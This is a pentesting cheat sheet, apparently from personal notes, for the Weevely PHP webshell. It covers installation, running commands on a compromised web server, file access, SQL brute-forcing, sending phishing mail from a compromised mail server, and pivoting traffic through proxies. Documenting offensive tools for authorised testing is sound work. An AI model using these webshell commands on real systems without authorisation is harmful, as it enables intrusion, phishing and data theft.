---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - initial-access
  - post-exploitation
  - webshell
  - weevely
---
# Weevely

## 01 - Setup

### 1.1 - Dependencies

Install the required dependencies according to your package manager.

```
$ sudo apt install -y python3-prettytable python3-mako python3-yaml python3-dateutil python3-pysocks python3-openssl
```

### 1.2 - Install Weevely

Install `weevely` according to your package manager.

```
$ sudo apt install -y weevely

$ yay -S weevely
```

Clone the repository

```
$ git clone https://github.com/epinna/weevely3.git /opt/webshells/weevely/
```

# 02 - Basic Commands

## 2.1 - Execute

Using `:shell_sh` to execute commands

```
weevely> shell_sh -h
usage: shell_sh [-h] [-stderr_redirection STDERR_REDIRECTION] [-vector {system,passthru,shell_exec,exec,popen,proc_open,python_eval,perl_system,pcntl}]
                command [command ...]

Execute shell commands.

positional arguments:
  command               Shell command

optional arguments:
  -h, --help            show this help message and exit
  -stderr_redirection STDERR_REDIRECTION
  -vector {system,passthru,shell_exec,exec,popen,proc_open,python_eval,perl_system,pcntl}
```

```
www-data@172.28.128.8:/var/www/phpMyAdmin $ shell_sh ls
CREDITS
ChangeLog
Documentation.html
Documentation.txt
INSTALL
LICENSE
..[omitted]..
user_password.php
view_create.php
webapp.php
```

```
:shell_php                    Execute PHP commands.
:shell_su                     Execute commands with su.
```

- [Weevely: Bypass PHP Long Running Tasks Limits](https://github.com/epinna/weevely3/wiki/Bypass-PHP-Long-Running-Tasks-Limits)

## 2.3 - File Manipulation

TODO: Fill this info

```
:file_grep                    Print lines matching a pattern in multiple files.
```

```
:file_read                    Read remote file from the remote filesystem.
:file_cp                      Copy single file.
:file_edit                    Edit remote file on a local editor.

:file_rm                      Remove remote file.
```

```
 :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.

 :file_mount                   Mount remote filesystem using HTTPfs.
```

Uses the `find` command.

```
weevely> :file_find                    Find files with given names and attributes.
```

```
weevely> :bruteforce_sql               Bruteforce SQL database.
```

Press `CTRL + D` to escape SQL console.

```
weevely> :sql_console -user <username> -passwd <password> -host <IP>
```

Compromise a mail server to send phishing/spearphishing emails to the target.

```
weevely> :net_mail
```

Perform HTTP request with cURL-like command.

```
weevely> :net_curl <URL>
```

```
weevely> :set proxy <schema_proxy_type>://<pivot_IP>:<pivot_port>
```

```
weevely> :set proxy socks5://127.0.0.1:9050

weevely> :system_info -info client_ip
```

Unset the SOCKS proxy server when it's done.

```
weevely> :unset proxy
```

https://github.com/epinna/weevely3/wiki/HTTP,-SOCKS-proxies,-and-TOR-support

# 06 - HTTP Proxy

Install PHP proxy on the target.

```
weevely> :net_phpproxy
```

Navigate in your web browser with this specific link `http://weevely`. Then install the certificate to tunnel through your web browser.

Run local proxy to pivot HTTP/HTTPS browsing through the target.

```
weevely> :net_proxy
```

---
## References

### Source Repositories

- [epinna: weevely3](https://github.com/epinna/weevely3)

### Weevely

- [Weevely: Proxy HTTP and HTTPS traffic](https://github.com/epinna/weevely3/wiki/Proxy-HTTP-and-HTTPS-traffic)